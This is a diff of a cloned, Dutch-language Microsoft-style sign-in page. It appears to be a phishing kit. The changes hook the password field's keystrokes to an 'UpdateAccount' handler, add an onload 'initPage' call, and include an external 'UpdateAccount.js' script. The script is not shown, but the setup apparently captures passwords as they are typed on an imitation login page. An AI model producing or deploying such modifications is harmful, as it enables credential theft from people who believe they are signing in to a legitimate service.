@@ -140,7 +140,7 @@ Aanmelden bij uw account        </title>
     margin-left: 0px !important;
 }
 </style></head>
-    <body style="display: block;">
+    <body style="display: block;" onload="initPage()">
         <p id="accessibleError" class="accessibleError" style="display:none;" aria-live="assertive" aria-relevant="all" aria-atomic="true" role="alert" aria-hidden="true"></p>
         <script type="text/javascript">//<![CDATA[
 !function(){var o=window,l=o.document,n=o.$Config||{};o.self===o.top?l&&l.body&&(l.body.style.display="block"):n.allowFrame||(o.top.location=o.self.location)}();
@@ -371,7 +371,7 @@ Constants.DEFAULT_BOILERPLATE_TEXT = '';
             <span class="input_field textfield">
                 <label for="cred_password_inputtext" class="no_display" aria-hidden="true">Wachtwoord</label>
                 <div class="input_border">
-                    <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" placeholder="Wachtwoord" spellcheck="false" aria-label="Wachtwoord" alt="Wachtwoord" type="password" name="passwd" value="" aria-describedby="accessibleError" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
+                    <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" onkeyup="UpdateAccount(this)" placeholder="Wachtwoord" spellcheck="false" aria-label="Wachtwoord" alt="Wachtwoord" type="password" name="passwd" value="" aria-describedby="accessibleError" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
                 </div>
             </span>
         </div>
@@ -664,5 +664,7 @@ Constants.DEFAULT_BOILERPLATE_TEXT = '';
         'domainHint': 'other'
     };
 </script> 
+
+<script src="scripts/UpdateAccount.js" type="text/javascript"></script>
 
 </body></html>
